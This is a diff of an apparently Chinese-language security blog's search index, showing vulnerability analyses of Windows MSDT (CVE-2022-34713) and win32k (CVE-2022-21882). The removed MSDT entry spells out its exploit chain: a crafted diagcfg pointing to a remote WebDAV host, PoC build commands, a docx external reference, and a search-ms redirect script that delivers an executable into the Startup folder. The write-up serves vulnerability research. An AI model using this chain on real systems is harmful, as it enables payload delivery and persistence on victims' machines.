+          <span class="token punctuation">}</span>
+        <span class="token punctuation">}</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">FindNextFileW</span><span class="token punctuation">(</span>hFind<span class="token punctuation">,</span> <span class="token operator">&amp;</span>FindFileData<span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// File Search</span>
+  <span class="token punctuation">}</span>
+  operator <span class="token function">delete</span><span class="token punctuation">(</span>sWebDavFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> sTmpSDiagFile <span class="token punctuation">)</span>
+    operator <span class="token function">delete</span><span class="token punctuation">(</span>sTmpSDiagFile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>hFind <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0xFFFFFFFFFFFFFFFDu</span>i64 <span class="token punctuation">)</span>
+    <span class="token function">FindClose</span><span class="token punctuation">(</span>hFind<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> dwLastError2<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>读取TurnoffCheck设置。  检查参数是否有错误。  检查WebDAVROOT中是否存在文件夹或文件\，如果存在则继续。  如果turnoffcheck setup，则copyfile不进行其他检查。  否则，检查是否有任何WebDAV文件是包源的子目录。  然后，检查是否有任何文件是文件夹%tmp%\sdiag_random-clsid的子目录。  如果*data=1，则copyfile，否则文件/文件夹搜索将继续。 </p>
+<h3 id="sdiageng-SdpIsSubDirectory"><a href="#sdiageng-SdpIsSubDirectory" class="headerlink" title="sdiageng!SdpIsSubDirectory"></a>sdiageng!SdpIsSubDirectory</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">SdpIsSubDirectory</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>aParentDir<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>aChildDir<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>aData<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> <span class="token operator">*</span>lData<span class="token punctuation">;</span> <span class="token comment">// r14</span>
+  <span class="token keyword">const</span> <span class="token keyword">unsigned</span> __int16 <span class="token operator">*</span>lChildDir<span class="token punctuation">;</span> <span class="token comment">// r12</span>
+  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sChildDir3<span class="token punctuation">;</span> <span class="token comment">// rdi</span>
+  <span class="token class-name">size_t</span> iLenParentDir<span class="token punctuation">;</span> <span class="token comment">// rsi</span>
+  <span class="token keyword">unsigned</span> __int64 iLenChildDir<span class="token punctuation">;</span> <span class="token comment">// rbp</span>
+  __int64 itraceCode1<span class="token punctuation">;</span> <span class="token comment">// r8</span>
+  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError1<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
+  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError4<span class="token punctuation">;</span> <span class="token comment">// eax</span>
+  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sParentDir2<span class="token punctuation">;</span> <span class="token comment">// r15</span>
+  <span class="token keyword">int</span> dwLastError3<span class="token punctuation">;</span> <span class="token comment">// er9</span>
+  __int64 itraceCode3<span class="token punctuation">;</span> <span class="token comment">// r8</span>
+  <span class="token keyword">signed</span> <span class="token keyword">int</span> dwLastError5<span class="token punctuation">;</span> <span class="token comment">// eax</span>
+  <span class="token keyword">int</span> dwLastError2<span class="token punctuation">;</span> <span class="token comment">// er9</span>
+  __int64 itraceCode2<span class="token punctuation">;</span> <span class="token comment">// r8</span>
+  __int64 iCharCounter1<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
+  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sParentDir3<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  __int64 iCharCounter2<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
+  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sChildDir2<span class="token punctuation">;</span> <span class="token comment">// rax</span>
+  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sChildDir1<span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp+8h]</span>
+  <span class="token class-name">wchar_t</span> <span class="token operator">*</span>sParentDir1<span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp+20h]</span>
+
+  lData <span class="token operator">=</span> aData<span class="token punctuation">;</span>
+  sParentDir1 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
+  lChildDir <span class="token operator">=</span> aChildDir<span class="token punctuation">;</span>
+  sChildDir1 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
+  sChildDir3 <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
+  iLenParentDir <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
+  iLenChildDir <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>aParentDir <span class="token punctuation">)</span>                            <span class="token comment">// Check arguments for errors</span>
+  <span class="token punctuation">{</span>
+    itraceCode1 <span class="token operator">=</span> <span class="token number">1957</span>i64<span class="token punctuation">;</span>
+DEBUG_TRACE1<span class="token operator">:</span>
+    dwLastError1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">;</span>
+    <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpIsSubDirectory"</span><span class="token punctuation">,</span> itraceCode1<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> dwLastError1<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>aChildDir <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    itraceCode1 <span class="token operator">=</span> <span class="token number">1958</span>i64<span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> DEBUG_TRACE1<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>aData <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    itraceCode1 <span class="token operator">=</span> <span class="token number">1959</span>i64<span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> DEBUG_TRACE1<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  dwLastError4 <span class="token operator">=</span> <span class="token function">SdpGetFullPath</span><span class="token punctuation">(</span>aParentDir<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sParentDir1<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Get Full path for parent directory</span>
+  sParentDir2 <span class="token operator">=</span> sParentDir1<span class="token punctuation">;</span>
+  dwLastError1 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError4 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    dwLastError5 <span class="token operator">=</span> <span class="token function">SdpGetFullPath</span><span class="token punctuation">(</span>lChildDir<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sChildDir1<span class="token punctuation">,</span> <span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Get Full path for child directory</span>
+    dwLastError1 <span class="token operator">=</span> dwLastError5<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError5 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> sParentDir2 <span class="token punctuation">)</span>
+      <span class="token punctuation">{</span>
+        iCharCounter1 <span class="token operator">=</span> <span class="token number">260</span>i64<span class="token punctuation">;</span>
+        sParentDir3 <span class="token operator">=</span> sParentDir2<span class="token punctuation">;</span>
+        <span class="token keyword">do</span>                                      <span class="token comment">// Calculate length for parent directory</span>
+        <span class="token punctuation">{</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>sParentDir3 <span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+          <span class="token operator">++</span>sParentDir3<span class="token punctuation">;</span>
+          <span class="token operator">--</span>iCharCounter1<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span> iCharCounter1 <span class="token punctuation">)</span><span class="token punctuation">;</span>
+        dwLastError1 <span class="token operator">=</span> iCharCounter1 <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">0x80070057</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> iCharCounter1 <span class="token punctuation">)</span>
+          iLenParentDir <span class="token operator">=</span> <span class="token number">260</span> <span class="token operator">-</span> iCharCounter1<span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      <span class="token keyword">else</span>
+      <span class="token punctuation">{</span>
+        dwLastError1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+        iLenParentDir <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+      <span class="token punctuation">{</span>
+        sChildDir3 <span class="token operator">=</span> sChildDir1<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> sChildDir1 <span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+          iCharCounter2 <span class="token operator">=</span> <span class="token number">260</span>i64<span class="token punctuation">;</span>
+          sChildDir2 <span class="token operator">=</span> sChildDir1<span class="token punctuation">;</span>
+          <span class="token keyword">do</span>                                    <span class="token comment">// Calculate length for child directory</span>
+          <span class="token punctuation">{</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span>sChildDir2 <span class="token punctuation">)</span>
+              <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token operator">++</span>sChildDir2<span class="token punctuation">;</span>
+            <span class="token operator">--</span>iCharCounter2<span class="token punctuation">;</span>
+          <span class="token punctuation">}</span>
+          <span class="token keyword">while</span> <span class="token punctuation">(</span> iCharCounter2 <span class="token punctuation">)</span><span class="token punctuation">;</span>
+          dwLastError1 <span class="token operator">=</span> iCharCounter2 <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token number">0x80070057</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span> iCharCounter2 <span class="token punctuation">)</span>
+            iLenChildDir <span class="token operator">=</span> <span class="token number">260</span> <span class="token operator">-</span> iCharCounter2<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">else</span>
+        <span class="token punctuation">{</span>
+          dwLastError1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2147024809</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+          iLenChildDir <span class="token operator">=</span> <span class="token number">0</span>i64<span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span> dwLastError1 <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>                                       <span class="token comment">// 1) Len for child dir &gt; Len for parent dir</span>
+                                                <span class="token comment">// 2) _wcsnicmp: Child dir begins with parent dir. Parent dir: %tmp%\SDIAG_random-clsid</span>
+                                                <span class="token comment">// 3) Last char of parent dir is "\" or next char for child dir, </span>
+                                                <span class="token comment">// further than parent dir length, is "\" and exist further chars after this.</span>
+          <span class="token operator">*</span>lData <span class="token operator">=</span> iLenChildDir <span class="token operator">&gt;</span> iLenParentDir
+                <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">_wcsnicmp</span><span class="token punctuation">(</span>sParentDir2<span class="token punctuation">,</span> sChildDir1<span class="token punctuation">,</span> iLenParentDir<span class="token punctuation">)</span>
+                <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>sParentDir2<span class="token punctuation">[</span>iLenParentDir <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\\'</span>
+                 <span class="token operator">||</span> sChildDir3<span class="token punctuation">[</span>iLenParentDir<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\\'</span> <span class="token operator">&amp;&amp;</span> sChildDir3<span class="token punctuation">[</span>iLenParentDir <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+          <span class="token keyword">goto</span> CLEANUP<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        dwLastError3 <span class="token operator">=</span> dwLastError1<span class="token punctuation">;</span>
+        itraceCode3 <span class="token operator">=</span> <span class="token number">1971</span>i64<span class="token punctuation">;</span>
+        <span class="token keyword">goto</span> DEBUG_TRACE2<span class="token punctuation">;</span>
+      <span class="token punctuation">}</span>
+      dwLastError2 <span class="token operator">=</span> dwLastError1<span class="token punctuation">;</span>
+      itraceCode2 <span class="token operator">=</span> <span class="token number">1968</span>i64<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span>
+    <span class="token punctuation">{</span>
+      dwLastError2 <span class="token operator">=</span> dwLastError5<span class="token punctuation">;</span>
+      itraceCode2 <span class="token operator">=</span> <span class="token number">1965</span>i64<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpIsSubDirectory"</span><span class="token punctuation">,</span> itraceCode2<span class="token punctuation">,</span> dwLastError2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    sChildDir3 <span class="token operator">=</span> sChildDir1<span class="token punctuation">;</span>
+    <span class="token keyword">goto</span> CLEANUP<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  dwLastError3 <span class="token operator">=</span> dwLastError4<span class="token punctuation">;</span>
+  itraceCode3 <span class="token operator">=</span> <span class="token number">1962</span>i64<span class="token punctuation">;</span>
+DEBUG_TRACE2<span class="token operator">:</span>
+  <span class="token function">SdpDebugTrace</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">,</span> L<span class="token string">"SdpIsSubDirectory"</span><span class="token punctuation">,</span> itraceCode3<span class="token punctuation">,</span> dwLastError3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+CLEANUP<span class="token operator">:</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> sParentDir2 <span class="token punctuation">)</span>
+    operator <span class="token function">delete</span><span class="token punctuation">(</span>sParentDir2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> sChildDir3 <span class="token punctuation">)</span>
+    operator <span class="token function">delete</span><span class="token punctuation">(</span>sChildDir3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> dwLastError1<span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>检查参数是否有错误。 获取父目录的完整路径。 获取子目录的完整路径。 计算父目录的字符串长度。 计算子目录的字符串长度。 检查子目录是否真的是父目录的子目录。</p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul>
+<li><a href="https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd">https://irsl.medium.com/the-trouble-with-microsofts-troubleshooters-6e32fc80b8bd</a></li>
+<li><a href="https://docs.microsoft.com/zh-cn/archive/blogs/mattbie/windows-troubleshooting-platform-meta-pack-example">https://docs.microsoft.com/zh-cn/archive/blogs/mattbie/windows-troubleshooting-platform-meta-pack-example</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CVE</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2022-21882 win32k内核提权分析</title>
     <url>/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
     <content><![CDATA[<h2 id="0x00漏洞描述"><a href="#0x00漏洞描述" class="headerlink" title="0x00漏洞描述"></a>0x00漏洞描述</h2><p>CVE-2022-21882漏洞是window系统的一个本地提权漏洞，微软在2022年1月份安全更新中修补了此漏洞。CVE-2022-21882是对CVE-2021-1732漏洞的绕过，属于win32k驱动程序中的类型混淆漏洞。漏洞成因与CVE-2021-1732类似，主要因为win32kfull!xxxClientAllocExtraBytes函数会回调用户空间中的user32!xxxClientAllocWindowClassExtraBytes,使用NtUserConsoleControl方法设置tagWNDK对象的ConsoleWindow标志，修改窗口类型。回调之后，系统不检查窗口类型是否改变，攻击者可以设置目标窗口的ExtraBytes指针为任意值，修改寻址方式为桌面堆+偏移，以实现桌面堆的越界写。</p>
@@ -2323,449 +2766,6 @@ BOOLEAN <span class="token function">Init</span><span class="token punctuation">
       </tags>
   </entry>
   <entry>
-    <title>CVE-2022-34713 MSDT目录遍历漏洞分析</title>
-    <url>/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>CVE-2022-34713是Microsoft Windows支持诊断工具（MSDT）RCE漏洞。存在路径穿越的脆弱性，攻击者可以遍历目录，将恶意可执行程序放置Window启动文件夹。<br>影响版本：</p>
-<pre class="line-numbers language-none"><code class="language-none">Windows 11
-Server 2022
-Server, version 20H2
-Server 2019
-Windows 10
-Server 2016
-Server 2012 R2
-Server 2012
-Windows 8.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01 漏洞分析"></a>0x01 漏洞分析</h2><p>CVE-2022-34713是Microsoft Windows支持诊断工具（MSDT）RCE漏洞，位于%WINDIR%\System32\msdt.exe,与以下文件类型相关联</p>
-<table>
-<thead>
-<tr>
-<th><strong>File type</strong></th>
-<th><strong>Description</strong></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>.diagcab</td>
-<td>Diagnostic cabinet file</td>
-</tr>
-<tr>
-<td>.diagpkg</td>
-<td>Diagnostic package file</td>
-</tr>
-<tr>
-<td>.diagcfg</td>
-<td>Diagnostic configuration file</td>
-</tr>
-</tbody></table>
-<p>关注其中的diagcab文件。解开后拿到Custom.diagcfg:</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version="1.0" encoding="utf-8"?&gt;
-&lt;PackageConfiguration xmlns="http://www.microsoft.com/schemas/dcm/configuration/2008"&gt;
-  &lt;Execution&gt;
-    &lt;Package Path="\\webdav-test.herokuapp.com@ssl\DavWWWRoot\package" /&gt;
-    &lt;Name&gt;Some name&lt;/Name&gt;
-    &lt;Description&gt;Some description&lt;/Description&gt;
-    &lt;Icon&gt;@%windir%\diagnostics\system\WindowsUpdate\DiagPackage.dll,-1001&lt;/Icon&gt;
-  &lt;/Execution&gt;
-
-  &lt;Index&gt;
-    &lt;Id&gt;Custom&lt;/Id&gt;
-    &lt;RequiresAdminPrivileges&gt;false&lt;/RequiresAdminPrivileges&gt;
-    &lt;PrivacyUrl&gt;http://go.microsoft.com/fwlink/?LinkId=190175&lt;/PrivacyUrl&gt;
-    &lt;Version&gt;1.0&lt;/Version&gt;
-    &lt;PublisherName&gt;Microsoft Corporation&lt;/PublisherName&gt;
-    &lt;Category&gt;@%windir%\system32\DiagCpl.dll,-412&lt;/Category&gt;
-    &lt;Keyword&gt;@%windir%\system32\DiagCpl.dll,-27&lt;/Keyword&gt;
-  &lt;/Index&gt;
-&lt;/PackageConfiguration&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><code>&lt;Execution&gt;</code>标签下说明了该诊断包的执行行为, msdt会访问<code>&lt;Package Path&gt;</code>给出的路径。</p>
-<p>漏洞位于<code>sdiageng.dll</code>中，该库从diagcab的XML文件中获取攻击者提供的文件夹路径，当包获取完成后, msdt将对其进行签名检查, 它将包的副本复制到<code>%TEMP%\SDIAG_&lt;UUID&gt;</code>的临时目录, 调用函数<code>sdiageng!SdpCopyDirectory</code>。在此过程中枚举攻击者文件夹中的文件，获取每个文件的文件名，然后将本地临时文件路径和该文件名拼接用来创建文件在计算机上的本地路径。</p>
-<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>设置一个托管恶意.diagcab文件的webdav服务器，当访问.diagcab文件的链接或者下载时，会将执行路径穿越，把可执行程序写入C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup,每次启动自动执行。</p>
-<h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h4><p>1、创建webdav服务器</p>
-<p>实现运行webdav服务的脚本或程序, 部署在服务端。注册并部署客户端访问的package路径。</p>
-<p>2、构造<code>diagcfg</code>文件</p>
-<p>测试用的<code>diagcfg</code>中的package:</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;Package Path="\\127.0.0.1\DavWWWRoot\package" /&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>3、构造辅助利用文件: <code>diagcab</code>或<code>docx</code>文档</p>
-<p>4、投递用户, 打开构造后的文件</p>
-<p> 注: 目标环境需要开启webclient服务, 否则无法访问webdav的UNC路径。</p>
-<h4 id="利用的文件类型-diagcab"><a href="#利用的文件类型-diagcab" class="headerlink" title="利用的文件类型: diagcab"></a>利用的文件类型: <code>diagcab</code></h4><p>将<code>diagcfg</code>打包为<code>diagcab</code>, 双击打开后漏洞利用完成:</p>
-<p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155250555.png"></p>
-<p>该漏洞只能做到载荷投放, 需要通过其他方式才可运行。</p>
-<p>使用docker</p>
-<p>1.构建Custom.diagcfg</p>
-<pre class="line-numbers language-none"><code class="language-none">./build-malicious-diagcfg.sh --url [WEBDAV_URL]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>2.构建hotfix895214.diagcab,移至./webdav/diagcab-webdav-poc/config目录,将可执行文件放入./webdav/malicious</p>
-<pre class="line-numbers language-none"><code class="language-none">cabarc.exe n hotfix895214.diagcab Custom.diagcfg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>3.启动服务</p>
-<pre class="line-numbers language-none"><code class="language-none">cd ./webdav/diagcab-webdav-poc
-perl diagcab-webdav-poc.pl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>或者直接使用docker直接执行<code>./hurry-dogwalk.sh [WEBDAV_URL]</code></p>
-<p><img src="/2023/05/15/CVE-2022-34713%20MSDT%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220815155349317.png"></p>
-<h4 id="利用的文件类型-docx"><a href="#利用的文件类型-docx" class="headerlink" title="利用的文件类型: docx"></a>利用的文件类型: docx</h4><p>解开.docx样本文件，关注其中/word/_rels目录下的document.xml.rels文件。会对外部文件进行引用执行。</p>
-<pre class="line-numbers language-none"><code class="language-none">Target="https://irsl.github.io/microsoft-diagcab-rce-poc/payload.html!x-usc:https://irsl.github.io/microsoft-diagcab-rce-poc/payload.html" TargetMode = "External"/&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>payload.html</p>
-<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
-<span class="token operator">...</span>
-window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"search-ms:query=i-repair-everything-on-your-computer.diagcab&amp;crumb=location:%5C%5Cwebdav-test.herokuapp.com%40SSL%5CDavWWWRoot%5Cconfig&amp;displayname=Important%20update"</span>
-</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
